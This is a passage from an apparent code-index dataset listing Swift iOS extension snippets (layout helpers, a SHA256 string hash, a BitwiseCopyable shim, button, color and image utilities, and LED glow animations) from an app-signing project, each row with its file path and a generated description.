topAnchor.constraint(equalTo: target.topAnchor),
])
}

/// Sets layout margins for the view or guide"
1407,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Foundation/BasicLayoutAnchorsHolding.swift","/ Sets layout margins for the view or guide","func setLayoutMargins(_ margins: UIEdgeInsets) {
guard let view = self as? UIView else { return }"
1408,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Foundation/BasicLayoutAnchorsHolding.swift","extension UIView - UI component for display and interaction","extension UIView: BasicLayoutAnchorsHolding {}

extension UILayoutGuide: BasicLayoutAnchorsHolding {"
1409,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Foundation/BasicLayoutAnchorsHolding.swift","extension UILayoutGuide - implements functionality related to u i layout guide","extension UILayoutGuide: BasicLayoutAnchorsHolding {
var layoutMargins: UIEdgeInsets {"
1410,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Foundation/String+Crypto.swift","extension String - implements functionality related to string","extension String {
/// Generate SHA256 hash of the string
func sha256() -> String {"
1411,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Foundation/String+Crypto.swift","/ Generate SHA256 hash of the string","func sha256() -> String {
let data = Data(utf8)
var hash = [UInt8](repeating: 0, count: Int(CC_SHA256_DIGEST_LENGTH))

data.withUnsafeBytes { buffer in"
1412,swift,iOS,protocol,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Foundation/Compatibility/BitwiseCopyableShim.swift","protocol BitwiseCopyable - implements functionality related to bitwise copyable","public protocol BitwiseCopyable {}

// Extend built-in Swift types that would normally conform to BitwiseCopyable
extension Int: BitwiseCopyable {}"
1413,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Foundation/Compatibility/BitwiseCopyableShim.swift","Extend built-in Swift types that would normally conform to BitwiseCopyable","extension Int: BitwiseCopyable {}
extension UInt: BitwiseCopyable {}"
1414,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Foundation/Compatibility/BitwiseCopyableShim.swift","extension UInt - implements functionality related to u int","extension UInt: BitwiseCopyable {}
extension Bool: BitwiseCopyable {}"
1415,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Foundation/Compatibility/BitwiseCopyableShim.swift","extension Bool - implements functionality related to bool","extension Bool: BitwiseCopyable {}
extension Float: BitwiseCopyable {}"
1416,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Foundation/Compatibility/BitwiseCopyableShim.swift","extension Float - implements functionality related to float","extension Float: BitwiseCopyable {}
extension Double: BitwiseCopyable {}"
1417,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Foundation/Compatibility/BitwiseCopyableShim.swift","extension Double - implements functionality related to double","extension Double: BitwiseCopyable {}
extension String: BitwiseCopyable {}"
1418,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Foundation/Compatibility/BitwiseCopyableShim.swift","extension String - implements functionality related to string","extension String: BitwiseCopyable {}
extension Optional: BitwiseCopyable where Wrapped: BitwiseCopyable {}"
1419,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Foundation/Compatibility/BitwiseCopyableShim.swift","extension Optional - implements functionality related to optional","extension Optional: BitwiseCopyable where Wrapped: BitwiseCopyable {}
extension Array: BitwiseCopyable where Element: BitwiseCopyable {}"
1420,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Foundation/Compatibility/BitwiseCopyableShim.swift","extension Array - implements functionality related to array","extension Array: BitwiseCopyable where Element: BitwiseCopyable {}
extension Dictionary: BitwiseCopyable where Key: BitwiseCopyable, Value: BitwiseCopyable {}"
1421,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Foundation/Compatibility/BitwiseCopyableShim.swift","extension Dictionary - implements functionality related to dictionary","extension Dictionary: BitwiseCopyable where Key: BitwiseCopyable, Value: BitwiseCopyable {}

// Add other common types that would reasonably implement BitwiseCopyable
extension Date: BitwiseCopyable {}"
1422,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Foundation/Compatibility/BitwiseCopyableShim.swift","Add other common types that would reasonably implement BitwiseCopyable","extension Date: BitwiseCopyable {}
extension Data: BitwiseCopyable {}"
1423,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Foundation/Compatibility/BitwiseCopyableShim.swift","extension Data - implements functionality related to data","extension Data: BitwiseCopyable {}
extension URL: BitwiseCopyable {}"
1424,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Foundation/Compatibility/BitwiseCopyableShim.swift","extension URL - implements functionality related to u r l","extension URL: BitwiseCopyable {}
extension UUID: BitwiseCopyable {}"
1425,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/Foundation/Compatibility/BitwiseCopyableShim.swift","extension UUID - implements functionality related to u u i d","extension UUID: BitwiseCopyable {}
#endif

// Note: This is a compatibility shim that will be bypassed when using
// Swift versions that natively support BitwiseCopyable
"
1426,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIApplication+TopViewController.swift","extension UIApplication - implements functionality related to u i application","extension UIApplication {
func topMostViewController() -> UIViewController? {"
1427,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIApplication+TopViewController.swift","Function topMostViewController - implements topmostviewcontroller functionality","func topMostViewController() -> UIViewController? {
guard let windowScene = connectedScenes.first as? UIWindowScene,
let window = windowScene.windows.first
else {"
1428,swift,iOS,enum,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIApplication+TopViewController.swift","Define notification names in a central location These notification names need to be unique across the app This is now defined in NotificationNames to avoid redeclaration issues Do not add changeTab here - use NotificationNames.changeTab instead Centralized enum for notification names to avoid ambiguity","public enum NotificationNames {
// Used for tab switching across the app
static let changeTab = Notification.Name(""com.backdoor.notifications.changeTab"")
// Define other notification names here
}
"
1429,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIApplication+returnToHomeScreen.swift","extension UIApplication - implements functionality related to u i application","extension UIApplication {
/// Returns from the foreground app to the home screen.
func returnToHomeScreen() {"
1430,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIApplication+returnToHomeScreen.swift","/ Returns from the foreground app to the home screen.","func returnToHomeScreen() {
LSApplicationWorkspace.default()
.openApplication(withBundleID: ""com.apple.springboard"")
}
}
"
1431,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIButton+Modern.swift","extension UIButton - implements functionality related to u i button","extension UIButton {
/// Apply modern style to a button with customizable parameters
///
/// - Parameters:
///   - color: The main color of the button
///   - cornerRadius: The corner radius of the button (default: 10)
///   - font: The font to use for the button title (default: .systemFont(ofSize: 16, weight: .medium))
///   - shadowEnabled: Whether to add a shadow to the button (default: true)
func applyModernStyle(
color: UIColor,"
1432,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIButton+Modern.swift","/ Apply modern style to a button with customizable parameters / / - Parameters: /   - color: The main color of the button /   - cornerRadius: The corner radius of the button (default: 10) /   - font: The font to use for the button title (default: .systemFont(ofSize: 16, weight: .medium)) /   - shadowEnabled: Whether to add a shadow to the button (default: true)","func applyModernStyle(
color: UIColor,
cornerRadius: CGFloat = 10,
font: UIFont = .systemFont(ofSize: 16, weight: .medium),
shadowEnabled: Bool = true
) {"
1433,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIButton+Modern.swift","/ Adds a scale-down animation when button is pressed","func addPressAnimation() {
addTarget(self, action: #selector(buttonPressed), for: [.touchDown, .touchDragEnter])
addTarget(
self,
action: #selector(buttonReleased),
for: [.touchUpInside, .touchUpOutside, .touchCancel, .touchDragExit]
)
}

@objc private func buttonPressed() {"
1434,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIButton+Modern.swift","Function buttonPressed - implements buttonpressed functionality","@objc private func buttonPressed() {
UIView.animate(withDuration: 0.2, delay: 0, options: [.curveEaseInOut, .allowUserInteraction], animations: {"
1435,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIButton+Modern.swift","Function buttonReleased - implements buttonreleased functionality","@objc private func buttonReleased() {
UIView.animate(withDuration: 0.2, delay: 0, options: [.curveEaseInOut, .allowUserInteraction], animations: {"
1436,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIButton+Modern.swift","/ Create a modern floating action button / / - Parameters: /   - image: The image to display in the button /   - color: The button's background color /   - size: The size of the button (width and height) / - Returns: A configured UIButton","static func modernFloatingButton(
image: UIImage?,
color: UIColor,
size: CGFloat = 56
) -> UIButton {"
1437,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIButton+Modern.swift","Helper extension to determine if a color is light or dark Use extension in same file instead of global to avoid redeclarations","private extension UIColor {
/// Determine if the color is light or dark
/// - Returns: True if the color is light, false if it's dark
func isLight() -> Bool {"
1438,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIButton+Modern.swift","/ Determine if the color is light or dark / - Returns: True if the color is light, false if it's dark","func isLight() -> Bool {
var red: CGFloat = 0
var green: CGFloat = 0
var blue: CGFloat = 0
var alpha: CGFloat = 0

getRed(&red, green: &green, blue: &blue, alpha: &alpha)

// Calculate relative luminance
let luminance = 0.2126 * red + 0.7152 * green + 0.0722 * blue"
1439,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIButton+Modern.swift","Example extension for gradient buttons","extension UIButton {
/// Apply a gradient background to the button
/// - Parameters:
///   - colors: Array of UIColors to use in the gradient
///   - direction: The direction of the gradient (horizontal or vertical)
func applyGradient(colors: [UIColor], direction: GradientDirection = .horizontal) {"
1440,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIButton+Modern.swift","/ Apply a gradient background to the button / - Parameters: /   - colors: Array of UIColors to use in the gradient /   - direction: The direction of the gradient (horizontal or vertical)","func applyGradient(colors: [UIColor], direction: GradientDirection = .horizontal) {
// Remove any existing gradient
layer.sublayers?.filter { $0 is CAGradientLayer }.forEach { $0.removeFromSuperlayer() }"
1441,swift,iOS,enum,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIButton+Modern.swift","/ Direction options for gradient","enum GradientDirection {
case horizontal
case vertical
case diagonal
}
}

// Extension for pill-shaped buttons
extension UIButton {"
1442,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIButton+Modern.swift","Extension for pill-shaped buttons","extension UIButton {
/// Convert the button to a modern pill shape
/// - Parameter color: The button's background color
func applyPillStyle(color: UIColor) {"
1443,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIButton+Modern.swift","/ Convert the button to a modern pill shape / - Parameter color: The button's background color","func applyPillStyle(color: UIColor) {
backgroundColor = color
// Use our private isLight() method
let isLightColor = color.isLight()
setTitleColor(isLightColor ? .black : .white, for: .normal)

// Make fully rounded
layer.cornerRadius = frame.height / 2
clipsToBounds = true
"
1444,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIButton+longpress.swift","extension UIButton - implements functionality related to u i button","extension UIButton {
private enum AssociatedKeys {"
1445,swift,iOS,enum,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIButton+longpress.swift","enum AssociatedKeys - implements functionality related to associated keys","private enum AssociatedKeys {
static var longPressGestureRecognizer = ""longPressGestureRecognizer""
}

var longPressGestureRecognizer: UILongPressGestureRecognizer? {"
1446,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIColor+Lottie.swift","Extension with color utilities (previously used for Lottie animations)","extension UIColor {
// Get color components as a tuple
var rgbaComponents: (red: CGFloat, green: CGFloat, blue: CGFloat, alpha: CGFloat) {"
1447,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIColor+hex.swift","extension UIColor - implements functionality related to u i color","extension UIColor {
convenience init(hex: String) {"
1448,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIColor+hex.swift","extension UIColor - implements functionality related to u i color","extension UIColor {
static func interpolate(from: UIColor, to: UIColor, with alpha: CGFloat) -> UIColor {"
1449,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIColor+hex.swift","Function interpolate - implements interpolate functionality","static func interpolate(from: UIColor, to: UIColor, with alpha: CGFloat) -> UIColor {
var fromRed: CGFloat = 0, fromGreen: CGFloat = 0, fromBlue: CGFloat = 0, fromAlpha: CGFloat = 0
from.getRed(&fromRed, green: &fromGreen, blue: &fromBlue, alpha: &fromAlpha)

var toRed: CGFloat = 0, toGreen: CGFloat = 0, toBlue: CGFloat = 0, toAlpha: CGFloat = 0
to.getRed(&toRed, green: &toGreen, blue: &toBlue, alpha: &toAlpha)

let interpolatedRed = fromRed + (toRed - fromRed) * alpha
let interpolatedGreen = fromGreen + (toGreen - fromGreen) * alpha
let interpolatedBlue = fromBlue + (toBlue - fromBlue) * alpha"
1450,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIColor+hex.swift","https://stackoverflow.com/a/69345997","public extension UIColor {
/// Creates a color object that responds to `userInterfaceStyle` trait changes.
convenience init(light: UIColor, dark: UIColor) {"
1451,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIControl+Apply.swift","extension UIControl - implements functionality related to u i control","extension UIControl {
/// Apply a configuration to a UIControl and return it (builder pattern)
/// - Parameter configuration: Configuration closure to apply to this control
/// - Returns: Self for chaining
@discardableResult
func apply(_ configuration: (Self) -> Void) -> Self {"
1452,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIControl+Apply.swift","Function apply - implements apply functionality","func apply(_ configuration: (Self) -> Void) -> Self {
// Apply the configuration to self
configuration(self)
// Return self for chaining
return self
}
}
"
1453,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIImage+resize.swift","extension UIImage - implements functionality related to u i image","extension UIImage {
func resizeToSquare() -> UIImage? {"
1454,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIImage+resize.swift","Function resizeToSquare - implements resizetosquare functionality","func resizeToSquare() -> UIImage? {
// Determine the size for the square
let size = min(self.size.width, self.size.height)
let rect = CGRect(x: (self.size.width - size) / 2,
y: (self.size.height - size) / 2,
width: size,
height: size)

// Create a new graphics context with the square size
UIGraphicsBeginImageContextWithOptions(CGSize(width: size, height: size), false, scale)"
1455,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIImage+resize.swift","extension UIImage - implements functionality related to u i image","public extension UIImage {
/// Resize image while keeping the aspect ratio. Original image is not modified.
/// - Parameters:
///   - width: A new width in pixels.
///   - height: A new height in pixels.
/// - Returns: Resized image.
func resize(_ width: Int, _ height: Int) -> UIImage {"
1456,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIImage+resize.swift","/ Resize image while keeping the aspect ratio. Original image is not modified. / - Parameters: /   - width: A new width in pixels. /   - height: A new height in pixels. / - Returns: Resized image.","func resize(_ width: Int, _ height: Int) -> UIImage {
// Keep aspect ratio
let maxSize = CGSize(width: width, height: height)

let availableRect = AVFoundation.AVMakeRect(
aspectRatio: size,
insideRect: .init(origin: .zero, size: maxSize)
)
let targetSize = availableRect.size
"
1457,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UINavigationController+shouldPresentFullscreen.swift","extension UINavigationController - Controls user interface and application flow","extension UINavigationController {
func shouldPresentFullScreen() {"
1458,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UINavigationController+shouldPresentFullscreen.swift","Function shouldPresentFullScreen - implements shouldpresentfullscreen functionality","func shouldPresentFullScreen() {
if UIDevice.current.userInterfaceIdiom == .pad {"
1459,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UITabBar+LED.swift","extension UITabBar - implements functionality related to u i tab bar","extension UITabBar {
/// Add LED effect to the tab bar with simplified parameters
/// With improved error handling to prevent crashes
@objc func addTabBarLEDEffect(color: UIColor) {"
1460,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UITabBar+LED.swift","/ Add LED effect to the tab bar with simplified parameters / With improved error handling to prevent crashes","@objc func addTabBarLEDEffect(color: UIColor) {
// Skip adding effects if not in view hierarchy or not visible
guard window != nil, !isHidden, superview != nil else {"
1461,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIUserInterfaceStyle+allCases.swift","extension UIUserInterfaceStyle - implements functionality related to u i user interface style","extension UIUserInterfaceStyle: @retroactive CaseIterable {
public static var allCases: [UIUserInterfaceStyle] = [.unspecified, .dark, .light]
var description: String {"
1462,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIView+EntitlementsEditor.swift","/ Extension to add LED-style effects to entitlements editor UI components","extension UIView {
/// Applies an LED effect to text fields in the entitlements editor
func applyEntitlementFieldStyle() {"
1463,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIView+EntitlementsEditor.swift","/ Applies an LED effect to text fields in the entitlements editor","func applyEntitlementFieldStyle() {
// Apply corner radius
layer.cornerRadius = 8
clipsToBounds = true

// Apply border with LED effect
layer.borderWidth = 1.0

// Create glowing border color animation
let glowAnimation = CABasicAnimation(keyPath: ""borderColor"")"
1464,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIView+EntitlementsEditor.swift","/ Applies an LED effect to buttons in the entitlements editor","func applyEntitlementButtonStyle() {
// Apply general styling
layer.cornerRadius = 8
clipsToBounds = true

// Create background color animation for subtle pulsing effect
let pulseAnimation = CABasicAnimation(keyPath: ""backgroundColor"")
pulseAnimation.fromValue = UIColor.systemBlue.withAlphaComponent(0.7).cgColor
pulseAnimation.toValue = UIColor.systemBlue.withAlphaComponent(0.9).cgColor
pulseAnimation.duration = 1.2"
1465,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIView+EntitlementsEditor.swift","/ Applies an LED header style for section headers in the entitlements editor","func applyEntitlementHeaderStyle() {
// Apply corner radius
layer.cornerRadius = 6

// Create subtle background glow
let gradientLayer = CAGradientLayer()
gradientLayer.frame = bounds
gradientLayer.colors = [
UIColor.systemBlue.withAlphaComponent(0.1).cgColor,
UIColor.systemBlue.withAlphaComponent(0.2).cgColor,"
1466,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIView+EntitlementsEditor.swift","/ Adds a validation effect to show whether an entitlement is valid","func showValidationEffect(isValid: Bool) {
// Remove any existing animations
layer.removeAnimation(forKey: ""validationEffect"")

// Set colors based on validity
let color = isValid ? UIColor.systemGreen : UIColor.systemRed

// Create pulsing animation
let pulseAnimation = CABasicAnimation(keyPath: ""borderColor"")
pulseAnimation.fromValue = color.withAlphaComponent(0.4).cgColor"
1467,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIView+Extension.swift","extension UIView - UI component for display and interaction","extension UIView {
/// Find the view controller that contains this view
func findViewController() -> UIViewController? {"
1468,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIView+Extension.swift","/ Find the view controller that contains this view","func findViewController() -> UIViewController? {
var responder: UIResponder? = self
while let nextResponder = responder?.next {"
1469,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIView+Extension.swift","extension UILabel - implements functionality related to u i label","extension UILabel {
/// Add padding to a UILabel
var padding: UIEdgeInsets {"
1470,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIView+Extension.swift","extension UIEdgeInsets - implements functionality related to u i edge insets","extension UIEdgeInsets {
func inverted() -> UIEdgeInsets {"
1471,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIView+Extension.swift","Function inverted - implements inverted functionality","func inverted() -> UIEdgeInsets {
return UIEdgeInsets(
top: -top,
left: -left,
bottom: -bottom,
right: -right
)
}
}
"
1472,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIView+LED.swift","/ Extension for adding LED lighting effects to UIView elements","extension UIView {
// MARK: - Properties

/// The LED gradient layer - stored as associated object
private var ledGradientLayer: CAGradientLayer? {"
1473,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIView+LED.swift","MARK: - Public Methods / Add a soft LED glow effect to the view / - Parameters: /   - color: The main color of the LED effect /   - intensity: Glow intensity (0.0-1.0, default: 0.6) /   - spread: How far the glow spreads (points, default: 10) /   - animated: Whether the glow should pulsate (default: true) /   - animationDuration: Duration of pulse animation if animated (default: 2.0)","func addLEDEffect(
color: UIColor,
intensity: CGFloat = 0.6,
spread: CGFloat = 10,
animated: Bool = true,
animationDuration: TimeInterval = 2.0
) {"
1474,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIView+LED.swift","/ Add a flowing LED effect that follows the outline of the view / - Parameters: /   - color: The main color of the LED effect /   - intensity: Glow intensity (0.0-1.0, default: 0.8) /   - width: Width of the flowing LED effect (default: 5) /   - speed: Animation speed - lower is faster (default: 2.0)","@objc func addFlowingLEDEffect(
color: UIColor,
intensity: CGFloat = 0.8,
width: CGFloat = 5,
speed: TimeInterval = 2.0
) {"
1475,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIView+LED.swift","/ Remove any LED lighting effects from the view","func removeLEDEffect() {
ledGradientLayer?.removeFromSuperlayer()
ledGradientLayer = nil
// Simply set the animation group to nil - it doesn't have a removeAllAnimations method
ledAnimationGroup = nil
}

// MARK: - Private Helper Methods

/// Update LED layer position when frame changes"
1476,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIView+LED.swift","MARK: - Private Helper Methods / Update LED layer position when frame changes","private func updateLEDLayerPosition() {
guard let ledLayer = ledGradientLayer else { return }"
1477,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIView+LED.swift","/ Add pulsating animation to the LED effect","private func addLEDAnimation(duration: TimeInterval, intensity: CGFloat) {
guard let ledLayer = ledGradientLayer else { return }"
1478,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIView+LED.swift","/ Animate the flowing LED effect","private func animateFlowingLED(speed: TimeInterval) {
guard let ledLayer = ledGradientLayer else { return }"
1479,swift,iOS,enum,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIView+LED.swift","MARK: - Associated Objects Keys","private enum AssociatedKeys {
static var ledGradientLayer: UnsafeRawPointer = .init(bitPattern: ""ledGradientLayer"".hashValue)!
static var ledAnimationGroup: UnsafeRawPointer = .init(bitPattern: ""ledAnimationGroup"".hashValue)!
}
}

// Convenience method for applying LED effects to UIButton
extension UIButton {"
1480,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIView+LED.swift","Convenience method for applying LED effects to UIButton","extension UIButton {
/// Add LED effect to button with appropriate settings
/// - Parameter color: The color of the LED effect (default: tint color)
func addButtonLEDEffect(color: UIColor? = nil) {"
1481,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIView+LED.swift","/ Add LED effect to button with appropriate settings / - Parameter color: The color of the LED effect (default: tint color)","func addButtonLEDEffect(color: UIColor? = nil) {
let effectColor = color ?? tintColor ?? .systemBlue
addLEDEffect(
color: effectColor,
intensity: 0.5,
spread: 12,
animated: true,
animationDuration: 2.0
)
}"
1482,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIView+LED.swift","/ Add flowing LED border to button / - Parameter color: The color of the LED effect (default: tint color)","func addButtonFlowingLEDEffect(color: UIColor? = nil) {
let effectColor = color ?? tintColor ?? .systemBlue
addFlowingLEDEffect(
color: effectColor,
intensity: 0.7,
width: 3,
speed: 3.0
)
}
}"
1483,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIView+LED.swift","Convenience methods for applying LED effects to UITabBar","extension UITabBar {
/// Add a flowing LED effect around the tab bar
/// - Parameter color: The color of the effect (default: tint color)
func addTabBarLEDEffect(color: UIColor? = nil) {"
1484,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIView+LED.swift","/ Add a flowing LED effect around the tab bar / - Parameter color: The color of the effect (default: tint color)","func addTabBarLEDEffect(color: UIColor? = nil) {
let effectColor = color ?? tintColor ?? .systemBlue
addFlowingLEDEffect(
color: effectColor,
intensity: 0.6,
width: 2,
speed: 4.0
)
}
}"
1485,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIView+LED.swift","Convenience methods for table view cells","extension UITableViewCell {
/// Add subtle LED effect to highlight important cells
/// - Parameter color: The color of the LED effect
func addCellLEDEffect(color: UIColor) {"
1486,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIView+LED.swift","/ Add subtle LED effect to highlight important cells / - Parameter color: The color of the LED effect","func addCellLEDEffect(color: UIColor) {
contentView.addLEDEffect(
color: color,
intensity: 0.3,
spread: 15,
animated: true,
animationDuration: 3.0
)
}
}"
1487,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIView+Modern.swift","extension UIView - UI component for display and interaction","extension UIView {
/// Apply modern card styling to a view
/// - Parameters:
///   - backgroundColor: The background color of the card
///   - cornerRadius: The corner radius (default: 12)
///   - shadowEnabled: Whether to add a shadow (default: true)
///   - shadowIntensity: How strong the shadow should be (default: 0.2)
func applyCardStyle(
backgroundColor: UIColor? = nil,
cornerRadius: CGFloat = 12,"
1488,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIView+Modern.swift","/ Apply modern card styling to a view / - Parameters: /   - backgroundColor: The background color of the card /   - cornerRadius: The corner radius (default: 12) /   - shadowEnabled: Whether to add a shadow (default: true) /   - shadowIntensity: How strong the shadow should be (default: 0.2)","func applyCardStyle(
backgroundColor: UIColor? = nil,
cornerRadius: CGFloat = 12,
shadowEnabled: Bool = true,
shadowIntensity: CGFloat = 0.2
) {"
1489,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIView+Modern.swift","/ Add a subtle bounce animation to a view / - Parameter duration: The duration of the animation","func addBounceAnimation(duration: TimeInterval = 0.3) {
UIView.animate(withDuration: duration / 2, animations: {"
1490,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIView+Modern.swift","/ Add a soft pulsing animation to draw attention to a view / - Parameters: /   - duration: Duration of each pulse /   - minScale: Minimum scale factor during pulse /   - maxScale: Maximum scale factor during pulse","func addPulseAnimation(duration: TimeInterval = 1.5, minScale _: CGFloat = 0.97, maxScale: CGFloat = 1.03) {
UIView.animate(withDuration: duration / 2, delay: 0, options: [.autoreverse, .repeat], animations: {"
1491,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIView+Modern.swift","/ Stops any current animations on the view","func stopAnimations() {
layer.removeAllAnimations()
transform = .identity
}

/// Add a gradient overlay to the view
/// - Parameters:
///   - colors: Array of colors to use in the gradient
///   - direction: Direction of the gradient
///   - locations: Optional array of locations for the gradient stops"
1492,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIView+Modern.swift","/ Add a gradient overlay to the view / - Parameters: /   - colors: Array of colors to use in the gradient /   - direction: Direction of the gradient /   - locations: Optional array of locations for the gradient stops","func addGradientBackground(
colors: [UIColor],
direction: GradientDirection = .topToBottom,
locations: [NSNumber]? = nil
) {"
1493,swift,iOS,enum,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIView+Modern.swift","/ Direction options for gradients","enum GradientDirection {
case leftToRight
case rightToLeft
case topToBottom
case bottomToTop
case topLeftToBottomRight
case bottomRightToTopLeft
}

/// Add a glass-like blur effect to the view"
